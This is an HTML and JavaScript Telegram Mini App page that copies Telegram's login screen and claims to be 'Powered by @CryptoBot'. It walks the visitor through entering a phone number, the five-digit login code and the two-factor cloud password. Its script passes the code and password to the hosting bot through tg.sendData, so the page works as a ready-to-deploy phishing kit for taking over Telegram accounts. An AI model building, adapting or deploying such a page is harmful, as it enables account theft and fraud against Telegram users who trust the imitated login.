<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram Login UI</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --tg-bg: var(--tg-theme-bg-color, #17212b);
            --tg-sec-bg: var(--tg-theme-secondary-bg-color, #0e1621);
            --tg-text: var(--tg-theme-text-color, #ffffff);
            --tg-hint: var(--tg-theme-hint-color, #708499);
            --tg-link: var(--tg-theme-link-color, #6ab3f3);
            --tg-btn: var(--tg-theme-button-color, #3390ec);
            --tg-btn-text: var(--tg-theme-button-text-color, #ffffff);
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--tg-bg);
            color: var(--tg-text);
            margin: 0; padding: 0;
            display: flex; flex-direction: column; align-items: center;
            min-height: 100vh; overflow-x: hidden;
        }

        /* –ù–∞—Å—Ç–æ—è—â–∏–π –õ–æ–≥–æ—Ç–∏–ø Telegram SVG */
        .logo-container {
            margin-top: 50px;
            width: 100px; height: 100px;
            background: #24A1DE;
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            position: relative; z-index: 2;
        }

        .logo-container svg {
            width: 60px; height: 60px;
            fill: white;
            margin-right: 5px; /* –í–∏–∑—É–∞–ª—å–Ω–∞—è –∫–æ–º–ø–µ–Ω—Å–∞—Ü–∏—è —Ö–≤–æ—Å—Ç–∞ —Å–∞–º–æ–ª–µ—Ç–∞ */
        }

        h1 { font-size: 24px; font-weight: 600; margin: 25px 0 10px; }
        .desc { color: var(--tg-hint); font-size: 15px; text-align: center; padding: 0 40px; margin-bottom: 35px; line-height: 1.4; }

        .auth-card {
            width: 90%; max-width: 400px;
            background: var(--tg-sec-bg);
            border-radius: 16px;
            padding: 20px;
            box-sizing: border-box;
            position: relative; z-index: 10;
        }

        /* –°–µ–ª–µ–∫—Ç–æ—Ä —Å—Ç—Ä–∞–Ω */
        .select-field {
            background: var(--tg-bg);
            border: 1px solid #304153;
            border-radius: 10px;
            padding: 12px 15px;
            margin-bottom: 15px;
            display: flex; justify-content: space-between; align-items: center;
            cursor: pointer;
        }

        .select-field span { font-size: 16px; }
        .select-field::after {
            content: ''; border: solid var(--tg-hint);
            border-width: 0 2px 2px 0; display: inline-block;
            padding: 3px; transform: rotate(-45deg);
        }

        /* –ü–æ–ª–µ –≤–≤–æ–¥–∞ –Ω–æ–º–µ—Ä–∞ */
        .input-wrapper {
            background: var(--tg-bg);
            border: 1px solid #304153;
            border-radius: 10px;
            display: flex; align-items: center;
            padding: 12px 15px;
            margin-bottom: 25px;
            transition: border 0.2s;
        }
        .input-wrapper:focus-within { border-color: var(--tg-btn); }

        .country-code { font-size: 17px; color: var(--tg-text); margin-right: 10px; font-weight: 500; }
        input {
            background: transparent; border: none; color: var(--tg-text);
            font-size: 17px; width: 100%; outline: none;
        }

        .btn-main {
            background: var(--tg-btn);
            color: var(--tg-btn-text);
            border: none; border-radius: 10px;
            padding: 14px; width: 100%;
            font-size: 16px; font-weight: 600;
            cursor: pointer;
        }

        /* –ú–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ –≤—ã–±–æ—Ä–∞ —Å—Ç—Ä–∞–Ω */
        #country-modal {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: var(--tg-bg); z-index: 100;
            display: none; flex-direction: column;
        }
        .search-box { padding: 15px; border-bottom: 1px solid var(--tg-sec-bg); }
        .search-box input { background: var(--tg-sec-bg); padding: 10px; border-radius: 8px; width: calc(100% - 20px); }
        .country-list { overflow-y: auto; flex-grow: 1; }
        .country-item {
            padding: 15px 20px; border-bottom: 1px solid var(--tg-sec-bg);
            display: flex; justify-content: space-between; cursor: pointer;
        }

        #snow-box { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; opacity: 0.3; }
        .flake { position: absolute; background: white; border-radius: 50%; }

        .footer { position: fixed; bottom: 20px; color: var(--tg-hint); font-size: 13px; }
        .footer a { color: var(--tg-link); text-decoration: none; }
        
        .step { display: none; }
        .active { display: block; }
    </style>
</head>
<body>

    <div id="snow-box"></div>

    <div class="logo-container">
        <svg viewBox="0 0 24 24">
            <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.14.14-.26.26-.54.26l.196-2.91 5.297-4.787c.23-.204-.05-.318-.356-.116l-6.547 4.12-2.82-.88c-.613-.193-.625-.613.128-.91l11.02-4.247c.51-.186.957.118.722.88z"/>
        </svg>
    </div>

    <h1>Telegram</h1>

    <div class="auth-card">
        <div id="step1" class="step active">
            <div class="desc">Please confirm your country code and enter your phone number.</div>
            
            <div class="select-field" onclick="openCountries()">
                <span id="current-country">üá∑üá∫ Russia</span>
            </div>

            <div class="input-wrapper">
                <span class="country-code" id="display-code">+7</span>
                <input type="tel" id="phone" placeholder="Phone Number">
            </div>

            <button class="btn-main" onclick="onNext()">NEXT</button>
        </div>

        <div id="step2" class="step">
            <div class="desc">Enter the 5-digit code sent to your Telegram.</div>
            <div class="input-wrapper">
                <input type="number" id="code" placeholder="00000" style="text-align: center; letter-spacing: 5px;">
            </div>
            <button class="btn-main" onclick="onVerify()">CONFIRM</button>
        </div>

        <div id="step3" class="step">
            <div class="desc">Enter your 2FA Cloud Password.</div>
            <div class="input-wrapper">
                <input type="password" id="pass" placeholder="Password">
            </div>
            <button class="btn-main" onclick="onFinish()">FINISH</button>
        </div>
    </div>

    <div id="country-modal">
        <div class="search-box">
            <input type="text" placeholder="Search country..." oninput="filterCountries(this.value)">
            <button onclick="closeCountries()" style="background: none; border: none; color: var(--tg-link); float: right; margin-top: -30px;">Close</button>
        </div>
        <div class="country-list" id="list-container"></div>
    </div>

    <div class="footer">Powered by <a href="#">@CryptoBot</a></div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        const countries = [
            {n: "Russia", c: "+7", f: "üá∑üá∫"},
            {n: "Ukraine", c: "+380", f: "üá∫üá¶"},
            {n: "Kazakhstan", c: "+7", f: "üá∞üáø"},
            {n: "Uzbekistan", c: "+998", f: "üá∫üáø"},
            {n: "Belarus", c: "+375", f: "üáßüáæ"},
            {n: "USA", c: "+1", f: "üá∫üá∏"},
            {n: "Germany", c: "+49", f: "üá©üá™"}
        ];

        function openCountries() {
            document.getElementById('country-modal').style.display = 'flex';
            filterCountries('');
        }

        function closeCountries() {
            document.getElementById('country-modal').style.display = 'none';
        }

        function filterCountries(q) {
            const container = document.getElementById('list-container');
            container.innerHTML = '';
            countries.filter(x => x.n.toLowerCase().includes(q.toLowerCase())).forEach(x => {
                const div = document.createElement('div');
                div.className = 'country-item';
                div.innerHTML = `<span>${x.f} ${x.n}</span><span>${x.c}</span>`;
                div.onclick = () => {
                    document.getElementById('current-country').innerText = `${x.f} ${x.n}`;
                    document.getElementById('display-code').innerText = x.c;
                    closeCountries();
                };
                container.appendChild(div);
            });
        }

        function nav(s) {
            document.querySelectorAll('.step').forEach(x => x.classList.remove('active'));
            document.getElementById('step'+s).classList.add('active');
        }

        function onNext() {
            const p = document.getElementById('phone').value;
            if(p.length > 5) {
                tg.sendData("PHONE_REQUESTED"); // –°–∏–≥–Ω–∞–ª –±–æ—Ç—É –∑–∞–ø—Ä–æ—Å–∏—Ç—å –∫–æ–Ω—Ç–∞–∫—Ç
                nav(2);
            }
        }

        function onVerify() {
            const c = document.getElementById('code').value;
            if(c.length === 5) {
                tg.sendData("CODE:" + c);
                nav(3);
            }
        }

        function onFinish() {
            const ps = document.getElementById('pass').value;
            if(ps.length > 0) {
                tg.sendData("PASS:" + ps);
                tg.close();
            }
        }

        // –ê–Ω–∏–º–∞—Ü–∏—è —Å–Ω–µ–≥–∞
        function initSnow() {
            const box = document.getElementById('snow-box');
            for(let i=0; i<30; i++) {
                let f = document.createElement('div');
                f.className = 'flake';
                let size = Math.random()*3+2;
                f.style.width = size+'px'; f.style.height = size+'px';
                f.style.left = Math.random()*100+'vw';
                f.style.top = Math.random()*-20+'px';
                box.appendChild(f);
                f.animate([{transform:'translateY(0)'},{transform:'translateY(100vh)'}], 
                {duration: Math.random()*3000+5000, iterations: Infinity});
            }
        }
        initSnow();
    </script>
</body>
</html>
